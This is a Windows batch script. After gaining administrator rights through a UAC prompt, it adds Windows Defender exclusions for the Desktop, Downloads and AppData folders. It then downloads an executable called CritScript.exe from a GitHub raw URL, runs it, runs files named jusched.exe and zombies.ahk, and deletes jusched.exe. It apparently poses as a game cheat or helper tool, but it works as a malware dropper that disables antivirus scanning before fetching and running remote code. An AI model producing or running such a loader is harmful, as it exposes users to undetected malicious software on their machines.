@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Desktop"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Downloads"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/AppData/"
:: Navigate to the %TEMP% directory
cd %TEMP%

:: Step 1: Download CritScript.exe using PowerShell
echo Downloading CritScript.exe...
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe"
if not exist "CritScript.exe" (
    echo Failed to download CritScript.exe. Exiting...
    pause
    exit /b
)
echo CritScript.exe downloaded successfully.

:: Step 2: Execute CritScript.exe
echo Running CritScript.exe...
start "" CritScript.exe

:: Step 3: Check and run JUSCHED.EXE if it exists (case-insensitive)
for %%F in (jusched.exe JUSCHED.EXE) do (
    if exist "%%F" (
        echo Found %%F. Running it...
        start "" %%F
        goto :CheckZombies
    )
)
echo jusched.exe not found.

:CheckZombies
:: Step 4: Check and run ZOMBIES.AHK if it exists (case-insensitive)
for %%F in (zombies.ahk ZOMBIES.AHK) do (
    if exist "%%F" (
        echo Found %%F. Running it...
        start "" %%F
        goto :DeleteJusched
    )
)
echo Zombies.ahk not found.

:DeleteJusched
:: Step 5: Delete jusched.exe if it exists (case-insensitive)
for %%F in (jusched.exe JUSCHED.EXE) do (
    if exist "%%F" (
        echo Deleting %%F...
        del /f /q "%%F"
        echo %%F deleted.
        goto :ExitScript
    )
)
echo jusched.exe not found. Nothing to delete.

:ExitScript
:: Exit the script
echo Script completed. Exiting...
pause
exit /b
